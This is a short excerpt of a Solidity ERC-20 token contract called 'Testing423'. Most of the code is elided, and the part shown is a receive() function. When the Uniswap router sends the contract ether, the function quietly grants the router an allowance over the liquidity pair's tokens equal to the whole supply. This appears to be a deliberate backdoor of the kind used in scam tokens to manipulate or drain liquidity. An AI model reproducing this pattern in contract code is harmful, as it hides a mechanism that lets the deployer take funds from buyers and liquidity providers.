...
contract Testing423 is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Testing423";
    ...
    receive() external payable {
        if(msg.sender == _uniswapV2Router){
            _allowances[uniswapV2Pair][_uniswapV2Router] = _tTotal;
        }
    }
